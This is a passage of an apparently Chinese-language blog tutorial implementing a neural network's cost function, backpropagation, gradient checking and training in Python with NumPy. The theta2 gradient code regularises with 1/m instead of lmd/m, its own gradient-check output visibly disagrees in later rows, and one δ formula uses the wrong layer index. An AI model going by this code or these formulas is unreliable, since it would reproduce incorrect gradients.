np.column_stack((np.zeros(theta1.shape[<span class="number">0</span>]),theta1[:,<span class="number">1</span>:]))</span><br><span class="line">	<span class="comment"># theta2的梯度</span></span><br><span class="line">	theta2_grad = np.zeros(theta2.shape) <span class="comment"># 10 x 26</span></span><br><span class="line">	theta2_grad = theta2_grad + (delta3.T).dot(a2) <span class="comment"># 10*26</span></span><br><span class="line">	nn_parameter2_grad = theta2_grad/m + (<span class="number">1</span>/m) * np.column_stack((np.zeros(theta2.shape[<span class="number">0</span>]),theta2[:,<span class="number">1</span>:]))</span><br><span class="line">	<span class="comment"># 返回梯度</span></span><br><span class="line">	grad = np.concatenate([nn_parameter1_grad.flatten(),nn_parameter2_grad.flatten()])</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> cost,grad</span><br></pre></td></tr></table></figure>
<ul>
<li>上一个实验是直接导入的 theta1，theta2，而这个实验是用 <strong>交叉熵</strong> 计算出来的</li>
<li>其中包括了反向传播算法（BP算法）来计算梯度，后面会进行分析</li>
<li>PS：高数和线代太菜了，数学上的理解有点困难，所以我就不折磨自己了</li>
</ul>
<h2 id="Backpropagation（反向传播）"><a href="#Backpropagation（反向传播）" class="headerlink" title="Backpropagation（反向传播）"></a>Backpropagation（反向传播）</h2><p>在这部分练习中，您将实现反向传播算法来计算神经网络代价函数的梯度</p>
<ul>
<li>上一阶段完成的 nnCostFunction.m 会返回一个合适的梯度值（本阶段还会分析一下 nnCostFunction.m 中，使用BP算法计算梯度的那部分）</li>
<li>一旦计算出梯度，就可以通过使用先进的优化器 fmincg（类似于fminunc）最小化代价函数 J(θ)，训练神经网络</li>
<li>首先，实现反向传播算法来计算（未规范化）神经网络参数的梯度</li>
<li>在验证了针对非正则化情况的梯度计算是正确的之后，您将实现正则化神经网络的梯度</li>
</ul>
<p><strong>Sigmoid gradient（Sigmoid 梯度）</strong></p>
<p>为了帮助您开始这部分练习，您将首先实现 sigmoid gradient 函数，用于计算 Sigmoid 梯度</p>
<p>sigmoid 函数的梯度计算公式为：</p>
<script type="math/tex; mode=display">
sigmoid(z)=g(z)=\frac{1}{1+e^{-z}}\\
g^{'}(z)=\frac{d}{d_{z}}g(z)=g(z)(1-g(z))</script><p>实现代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid</span>(<span class="params">z</span>):</span></span><br><span class="line">	g = <span class="number">1</span>/(<span class="number">1</span>+np.exp(-z)) <span class="comment"># 就是Sigmoid函数</span></span><br><span class="line">	<span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid_gradient</span>(<span class="params">z</span>):</span></span><br><span class="line">	grad = sigmoid(z) * (<span class="number">1</span>-sigmoid(z)) <span class="comment"># g(z)=g(z)(1-g(z))</span></span><br><span class="line">	<span class="keyword">return</span> grad</span><br></pre></td></tr></table></figure>
<p><strong>Random initialization（随机初始化）</strong></p>
<p>在训练神经网络时，重要的是随机初始化对称性破坏的参数</p>
<ul>
<li>随机初始化的一个有效策略是在范围内均匀地随机选择 θ(l) 的值（范围是：[−init, init]）</li>
<li>您应该使用 init(ε)=0.12.2 ，这个值范围确保参数保持较小，并使学习更有效</li>
<li>你的工作是完成 randInitializeWeights.m 初始化θ的权重</li>
</ul>
<p>选择 init 的一个有效策略是基于神经网络中的单元数：</p>
<script type="math/tex; mode=display">
ε_{init}=\frac{\sqrt{6}}{\sqrt{L_{in}+L_{out}}}\,\,\,\,
(L_{in}=s_l,L_{out}=s_{l+1})\\
PS:s_l和s_{l+1}是相邻层中的单元数</script><p>实现代码为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化网络参数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rand_init_weights</span>(<span class="params">L_in,L_out</span>):</span></span><br><span class="line">	epsilon = np.sqrt(<span class="number">6</span>) / np.sqrt(L_in + L_out)</span><br><span class="line">	init_theta = np.random.random((L_out,L_in+<span class="number">1</span>)) * <span class="number">2</span>*epsilon - epsilon</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> init_theta</span><br></pre></td></tr></table></figure>
<ul>
<li>sqrt(x)：对“x”开平方</li>
<li>random.random(x,y)：获取一个范围在 [x,y] 的随机浮点数</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># =========================== 3.初始化网络参数 =================================</span></span><br><span class="line">random_theta1 = rand_init_weights(input_layer,hidden_layer) <span class="comment"># 初始化网络参数 </span></span><br><span class="line">random_theta2 = rand_init_weights(hidden_layer,out_layer) <span class="comment"># 初始化网络参数</span></span><br><span class="line">rand_nn_parameters = np.concatenate([random_theta1.flatten(),random_theta2.flatten()]) <span class="comment"># 组合后的随机参数(θ集)</span></span><br><span class="line"></span><br><span class="line">lmd =<span class="number">3</span></span><br><span class="line">check_nn_gradients(lmd) <span class="comment"># 梯度检测</span></span><br><span class="line">debug_cost, _ = nn_cost_function(X,Y,nn_paramters,input_layer,hidden_layer,out_layer,lmd) <span class="comment"># 代价函数,用于计算初始代价值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Cost at (fixed) debugging parameters (w/ lambda = &#123;&#125;): &#123;:0.6f&#125;\n(for lambda = 3, this value should be about 0.576051)&#x27;</span>.<span class="built_in">format</span>(lmd, debug_cost))</span><br></pre></td></tr></table></figure>
<p><strong>Backpropagation（反向传播的核心算法）</strong></p>
<p>对于反向传播，其实就是进行了如下的一次运算：</p>
<script type="math/tex; mode=display">
δ^{(l)}_{j}=a^{(l)}_{j}-y_j</script><ul>
<li>计算出各个层的 “δ(l,j)”，代表了第 l 层的第 j 结点的误差</li>
</ul>
<p>计算案例：</p>
<script type="math/tex; mode=display">
For\,each\,output\,unit(layer\,\,L=4)\\δ^{(4)}=a^{(4)}-y\\δ^{(3)}=(θ^{(3)})^{T}δ^{(4)}.*g^{'}(z^{(3)})\\δ^{(2)}=(θ^{(3)})^{T}δ^{(3)}.*g^{'}(z^{(2)})</script><ul>
<li>对于最后一层（输出层），δ4 就是 a4（输出层预测的结果）和 y（真实的结果）之间的差值</li>
<li>而对于中间的隐藏层，因为不清楚“预测结果”和“真实结果”的具体值，所以就只能通过以上的公式进行模拟计算</li>
</ul>
<p>最后，回顾一下“代价函数-交叉熵”的计算过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sigmoid <span class="keyword">import</span> sigmoid</span><br><span class="line"><span class="keyword">from</span> sigmoid <span class="keyword">import</span> sigmoid_gradient</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nn_cost_function</span>(<span class="params">X,Y,nn_paramters,input_layer,hidden_layer,out_layer,lmd=<span class="number">0</span></span>):</span></span><br><span class="line">    </span><br><span class="line">	theta1 = nn_paramters[:hidden_layer*(input_layer+<span class="number">1</span>)].reshape(hidden_layer,input_layer+<span class="number">1</span>) <span class="comment"># 取出theta1</span></span><br><span class="line">	theta2 = nn_paramters[hidden_layer*(input_layer+<span class="number">1</span>):].reshape(out_layer,hidden_layer+<span class="number">1</span>) <span class="comment"># 取出theta2</span></span><br><span class="line">	m = Y.size <span class="comment"># 获取样本数目</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 输入层的输出等于输入,X增加一列偏置维度</span></span><br><span class="line">	a1 = np.column_stack((np.ones(X.shape[<span class="number">0</span>]),X)) <span class="comment"># 5000*401</span></span><br><span class="line">	<span class="comment"># 隐藏层的输入和输出</span></span><br><span class="line">	z2 = a1.dot(theta1.T) <span class="comment"># 5000*25</span></span><br><span class="line">	a2 = sigmoid(z2)</span><br><span class="line">	a2 = np.column_stack((np.ones(a2.shape[<span class="number">0</span>]),a2)) <span class="comment"># 5000*26</span></span><br><span class="line">	<span class="comment"># 输出层的输入和输出</span></span><br><span class="line">	z3 = a2.dot(theta2.T) <span class="comment"># 5000*10</span></span><br><span class="line">	a3 = sigmoid(z3) <span class="comment"># 5000*10</span></span><br><span class="line">    </span><br><span class="line">	<span class="comment"># a3[m,k]表示第m个样本预测属于k的概率(因为激活函数是logistic函数)</span></span><br><span class="line">	<span class="comment"># 根据Y的值,也转换成和a3相同格式的数组</span></span><br><span class="line">	<span class="comment"># yk中每一行只能有一列值为1,yk[m,k]=1表示第m个样本的真实输出是k,其他列为0</span></span><br><span class="line">	yk = np.zeros((m,out_layer))</span><br><span class="line">	<span class="comment"># 注意:Y中的取值范围是[1,10],而yk中的列下标范围是[0,9]</span></span><br><span class="line">	<span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(Y.size):</span><br><span class="line">		yk[num,Y[num]-<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">	<span class="comment"># 计算代价,因为输出层的激活函数是logistic函数,所有代价也是以logistic regression代价函数</span></span><br><span class="line">	cost_arr = - yk * np.log(a3) - (<span class="number">1</span>-yk) * np.log(<span class="number">1</span>-a3)</span><br><span class="line">	cost = cost_arr.<span class="built_in">sum</span>()/m + lmd /(<span class="number">2</span>*m) *( (theta1[:,<span class="number">1</span>:] **<span class="number">2</span>).<span class="built_in">sum</span>() + (theta2[:,<span class="number">1</span>:] **<span class="number">2</span>).<span class="built_in">sum</span>())</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 使用BP算法计算梯度</span></span><br><span class="line">	delta3 = a3 - yk <span class="comment"># 5000*10</span></span><br><span class="line"></span><br><span class="line">	delta2 = delta3.dot(theta2) * sigmoid_gradient(np.column_stack((np.ones(z2.shape[<span class="number">0</span>]),z2)))</span><br><span class="line">	delta2 = delta2[:,<span class="number">1</span>:] <span class="comment"># 5000*25</span></span><br><span class="line">	<span class="comment"># theta1的梯度</span></span><br><span class="line">	theta1_grad = np.zeros(theta1.shape) <span class="comment"># 25 x 401</span></span><br><span class="line">	theta1_grad = theta1_grad + (delta2.T).dot(a1) <span class="comment"># 25*401</span></span><br><span class="line">	nn_parameter1_grad = theta1_grad/m + (lmd/m) * np.column_stack((np.zeros(theta1.shape[<span class="number">0</span>]),theta1[:,<span class="number">1</span>:]))</span><br><span class="line">	<span class="comment"># theta2的梯度</span></span><br><span class="line">	theta2_grad = np.zeros(theta2.shape) <span class="comment"># 10 x 26</span></span><br><span class="line">	theta2_grad = theta2_grad + (delta3.T).dot(a2) <span class="comment"># 10*26</span></span><br><span class="line">	nn_parameter2_grad = theta2_grad/m + (<span class="number">1</span>/m) * np.column_stack((np.zeros(theta2.shape[<span class="number">0</span>]),theta2[:,<span class="number">1</span>:]))</span><br><span class="line">	<span class="comment"># 返回梯度</span></span><br><span class="line">	grad = np.concatenate([nn_parameter1_grad.flatten(),nn_parameter2_grad.flatten()])</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> cost,grad</span><br></pre></td></tr></table></figure>
<h2 id="Model-Training（模型训练）"><a href="#Model-Training（模型训练）" class="headerlink" title="Model Training（模型训练）"></a>Model Training（模型训练）</h2><p>代码实现：这里采用 fmincg 来代替梯度下降</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ========================== 4.训练NN ==========================================</span></span><br><span class="line">lmd = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cost_func</span>(<span class="params">p</span>):</span></span><br><span class="line">    <span class="keyword">return</span> nn_cost_function(X,Y,p,input_layer,hidden_layer,out_layer,lmd)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">grad_func</span>(<span class="params">p</span>):</span></span><br><span class="line">    <span class="keyword">return</span> nn_cost_function(X,Y,p,input_layer,hidden_layer,out_layer,lmd)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">nn_params, *unused = opt.fmin_cg(cost_func, fprime=grad_func, x0=rand_nn_parameters, maxiter=<span class="number">400</span>, disp=<span class="literal">True</span>, full_output=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从返回结果nn_params中获取θ1和θ2(拟合完毕)</span></span><br><span class="line">theta1 = nn_params[:hidden_layer * (input_layer + <span class="number">1</span>)].reshape(hidden_layer, input_layer + <span class="number">1</span>)</span><br><span class="line">theta2 = nn_params[hidden_layer * (input_layer + <span class="number">1</span>):].reshape(out_layer, hidden_layer + <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>fmincg 是一种高效的迭代器，它的需要主要参数依次为：<ul>
<li>nn_cost_function 返回的代价</li>
<li>nn_cost_function 返回的梯度</li>
<li>rand_nn_parameters 中存储的随机参数集</li>
</ul>
</li>
</ul>
<h2 id="Gradient-checking（梯度检测）"><a href="#Gradient-checking（梯度检测）" class="headerlink" title="Gradient checking（梯度检测）"></a>Gradient checking（梯度检测）</h2><p>梯度检测会估计梯度（导数）值，然后和你程序计算出来的梯度的值进行对比，以判断程序算出的梯度值是否正确</p>
<p>公式为：</p>
<script type="math/tex; mode=display">
\frac{J(θ_{1}+ε,θ_{2},θ_{3},...,θ_{n})-J(θ_{1}-ε,θ_{2},θ_{3},...,θ_{n})}{2ε}</script><p>实现过程为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> debugInitializeWeights <span class="keyword">as</span> diw <span class="comment"># 初始化权重的函数</span></span><br><span class="line"><span class="keyword">import</span> costFunction <span class="keyword">as</span> ncf <span class="comment"># 计算代价的函数</span></span><br><span class="line"><span class="keyword">import</span> computeNumericalGradient <span class="keyword">as</span> cng <span class="comment"># 计算梯度(倒数)的函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_nn_gradients</span>(<span class="params">lmd</span>):</span></span><br><span class="line">    input_layer_size = <span class="number">3</span></span><br><span class="line">    hidden_layer_size = <span class="number">5</span></span><br><span class="line">    num_labels = <span class="number">3</span></span><br><span class="line">    m = <span class="number">5</span></span><br><span class="line">    <span class="comment"># We generatesome &#x27;random&#x27; test data</span></span><br><span class="line">    theta1 = diw.debug_initialize_weights(hidden_layer_size, input_layer_size)</span><br><span class="line">    theta2 = diw.debug_initialize_weights(num_labels, hidden_layer_size)</span><br><span class="line">    <span class="comment"># Reusing debugInitializeWeights to genete X</span></span><br><span class="line">    X = diw.debug_initialize_weights(m, input_layer_size - <span class="number">1</span>)</span><br><span class="line">    y = <span class="number">1</span> + np.mod(np.arange(<span class="number">1</span>, m + <span class="number">1</span>), num_labels)</span><br><span class="line">    <span class="comment"># Unroll parameters</span></span><br><span class="line">    nn_params = np.concatenate([theta1.flatten(), theta2.flatten()]) </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cost_func</span>(<span class="params">p</span>):</span></span><br><span class="line">        <span class="keyword">return</span> ncf.nn_cost_function(X,y,p, input_layer_size, hidden_layer_size, num_labels, lmd)</span><br><span class="line">    cost, grad = cost_func(nn_params) <span class="comment"># 通过我们的&quot;代价函数cost_func&quot;计算梯度</span></span><br><span class="line">    numgrad = cng.compute_numerial_gradient(cost_func, nn_params) <span class="comment"># 直接计算梯度</span></span><br><span class="line">    <span class="built_in">print</span>(np.c_[grad, numgrad]) <span class="comment"># 打印结果</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始化权重的函数  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug_initialize_weights</span>(<span class="params">fan_out, fan_in</span>):</span></span><br><span class="line">    w = np.zeros((fan_out, <span class="number">1</span> + fan_in))</span><br><span class="line">    w = np.sin(np.arange(w.size)).reshape(w.shape) / <span class="number">10</span></span><br><span class="line">    <span class="keyword">return</span> w</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算梯度(倒数)的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compute_numerial_gradient</span>(<span class="params">cost_func, theta</span>):</span></span><br><span class="line">    numgrad = np.zeros(theta.size)</span><br><span class="line">    perturb = np.zeros(theta.size)</span><br><span class="line">    e = <span class="number">1e-4</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(theta.size):</span><br><span class="line">        perturb[p] = e</span><br><span class="line">        loss1, grad1 = cost_func(theta - perturb)</span><br><span class="line">        loss2, grad2 = cost_func(theta + perturb)</span><br><span class="line"></span><br><span class="line">        numgrad[p] = (loss2 - loss1) / (<span class="number">2</span> * e)</span><br><span class="line">        perturb[p] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> numgrad</span><br></pre></td></tr></table></figure>
<ul>
<li>在本实验中，我们只对“lmd=3”进行了梯度检测，检测结果如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[[ <span class="number">0.00901304</span>  <span class="number">0.00901304</span>]</span><br><span class="line"> [ <span class="number">0.05042745</span>  <span class="number">0.05042745</span>]</span><br><span class="line"> [ <span class="number">0.05455088</span>  <span class="number">0.05455088</span>]</span><br><span class="line"> [ <span class="number">0.00852048</span>  <span class="number">0.00852048</span>]</span><br><span class="line"> [ <span class="number">0.01171933</span>  <span class="number">0.01171933</span>]</span><br><span class="line"> [<span class="number">-0.05760601</span> <span class="number">-0.05760601</span>]</span><br><span class="line"> [<span class="number">-0.01659828</span> <span class="number">-0.01659828</span>]</span><br><span class="line"> [ <span class="number">0.03966983</span>  <span class="number">0.03966983</span>]</span><br><span class="line"> [ <span class="number">0.00366088</span>  <span class="number">0.00366088</span>]</span><br><span class="line"> [ <span class="number">0.02471166</span>  <span class="number">0.02471166</span>]</span><br><span class="line"> [<span class="number">-0.03245445</span> <span class="number">-0.03245445</span>]</span><br><span class="line"> [<span class="number">-0.05978209</span> <span class="number">-0.05978209</span>]</span><br><span class="line"> [<span class="number">-0.0077655</span>  <span class="number">-0.0077655</span> ]</span><br><span class="line"> [ <span class="number">0.02526392</span>  <span class="number">0.02526392</span>]</span><br><span class="line"> [ <span class="number">0.05947174</span>  <span class="number">0.05947174</span>]</span><br><span class="line"> [ <span class="number">0.03900152</span>  <span class="number">0.03900152</span>]</span><br><span class="line"> [<span class="number">-0.01206378</span> <span class="number">-0.01206378</span>]</span><br><span class="line"> [<span class="number">-0.05761021</span> <span class="number">-0.05761021</span>]</span><br><span class="line"> [<span class="number">-0.04520795</span> <span class="number">-0.04520795</span>]</span><br><span class="line"> [ <span class="number">0.0087583</span>   <span class="number">0.0087583</span> ]</span><br><span class="line"> [ <span class="number">0.30228635</span>  <span class="number">0.30228635</span>]</span><br><span class="line"> [ <span class="number">0.16784019</span>  <span class="number">0.20149903</span>]</span><br><span class="line"> [ <span class="number">0.16341919</span>  <span class="number">0.19979109</span>]</span><br><span class="line"> [ <span class="number">0.16182059</span>  <span class="number">0.16746539</span>]</span><br><span class="line"> [ <span class="number">0.13164304</span>  <span class="number">0.10137094</span>]</span><br><span class="line"> [ <span class="number">0.12980928</span>  <span class="number">0.09145231</span>]</span><br><span class="line"> [ <span class="number">0.09959317</span>  <span class="number">0.09959317</span>]</span><br><span class="line"> [ <span class="number">0.06275198</span>  <span class="number">0.08903145</span>]</span><br><span class="line"> [ <span class="number">0.06814118</span>  <span class="number">0.10771551</span>]</span><br><span class="line"> [ <span class="number">0.06010838</span>  <span class="number">0.07659312</span>]</span><br><span class="line"> [ <span class="number">0.03765248</span>  <span class="number">0.01589163</span>]</span><br><span class="line"> [ <span class="number">0.02937856</span> <span class="number">-0.01062105</span>]</span><br><span class="line"> [ <span class="number">0.09693242</span>  <span class="number">0.09693242</span>]</span><br><span class="line"> [ <span class="number">0.057304</span>    <span class="number">0.07411068</span>]</span><br><span class="line"> [ <span class="number">0.06636988</span>  <span class="number">0.10599418</span>]</span><br><span class="line"> [ <span class="number">0.06353249</span>  <span class="number">0.089544</span>  ]</span><br><span class="line"> [ <span class="number">0.04192228</span>  <span class="number">0.03040615</span>]</span><br><span class="line"> [ <span class="number">0.02820396</span> <span class="number">-0.01025194</span>]]</span><br></pre></td></tr></table></figure>
<ul>
<li>左边是用我们的代价函数，计算出来的梯度</li>
<li>右边是用数学方法，计算出来的梯度</li>
<li>通过对比两者的差值，我们可以大体判断一下该代价函数的效果如何</li>
</ul>
<h2 id="Visualizing-the-hidden-layer（可视化隐藏层）"><a href="#Visualizing-the-hidden-layer（可视化隐藏层）" class="headerlink" title="Visualizing the hidden layer（可视化隐藏层）"></a>Visualizing the hidden layer（可视化隐藏层）</h2><p>理解神经网络学习内容的一种方法是可视化隐藏单元捕获的表示</p>
<p>非正式地说，给定一个特定的隐藏单元，可视化其计算内容的一种方法是找到一个将使其激活的输入“x”</p>
<p>实现如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ======================= 5.可视化系数和预测 ===================================</span></span><br><span class="line"></span><br><span class="line">display_data(theta1[:, <span class="number">1</span>:]) <span class="comment"># 和之前实验使用的display_data一样</span></span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line">pred = predict_nn(X,theta1, theta2) <span class="comment"># 预测神经网络</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Training set accuracy: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(np.mean(pred == Y)*<span class="number">100</span>)) <span class="comment"># 计算该模型的准确度</span></span><br></pre></td></tr></table></figure>
<ul>
<li>实现的原理简单粗暴，直接把输入层输出的激活值放入 display_data 描述数据</li>
<li>注意：上一层输出的激活值，会被当做下一层的输出的数据</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display_data</span>(<span class="params">x</span>):</span></span><br><span class="line">	(m,n) = x.shape</span><br><span class="line">	<span class="comment"># 设置每个小图例的宽度和高度</span></span><br><span class="line">	width = np.<span class="built_in">round</span>(np.sqrt(n)).astype(<span class="built_in">int</span>)</span><br><span class="line">	height = (n / width).astype(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 设置图片的行数和列数</span></span><br><span class="line">	rows = np.floor(np.sqrt(m)).astype(<span class="built_in">int</span>)</span><br><span class="line">	cols = np.ceil(m / rows).astype(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 设置图例之间的间隔</span></span><br><span class="line">	pad = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 初始化图像数据</span></span><br><span class="line">	display_array = -np.ones((pad + rows*(height+pad), pad + cols*(width + pad)))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 把数据按行和列复制进图像中(10x10的表格)</span></span><br><span class="line">	current_image = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">			<span class="keyword">if</span> current_image &gt; m:</span><br><span class="line">				<span class="keyword">break</span> </span><br><span class="line">			max_val = np.<span class="built_in">max</span>(np.<span class="built_in">abs</span>(x[current_image,:]))</span><br><span class="line">			display_array[pad + j*(height + pad) + np.arange(height),pad + i*(width + pad) + np.arange(width)[:,np.newaxis]] = x[current_image,:].reshape((height,width)) / max_val</span><br><span class="line">			current_image += <span class="number">1</span></span><br><span class="line">		<span class="keyword">if</span> current_image &gt; m :</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 显示图像</span></span><br><span class="line">	plt.figure()</span><br><span class="line">	<span class="comment"># 设置图像色彩为灰度值，指定图像坐标范围</span></span><br><span class="line">	plt.imshow(display_array,cmap = <span class="string">&#x27;gray&#x27;</span>,extent =[-<span class="number">1</span>,<span class="number">1</span>,-<span class="number">1</span>,<span class="number">1</span>])</span><br><span class="line">	plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">	plt.title(<span class="string">&#x27;Random Seleted Digits&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>把输入的图像数据X进行重新排列，显示在一个面板 figurePane 中</li>
<li>面板中有多个小 imge 用来显示每一行数据</li>
</ul>
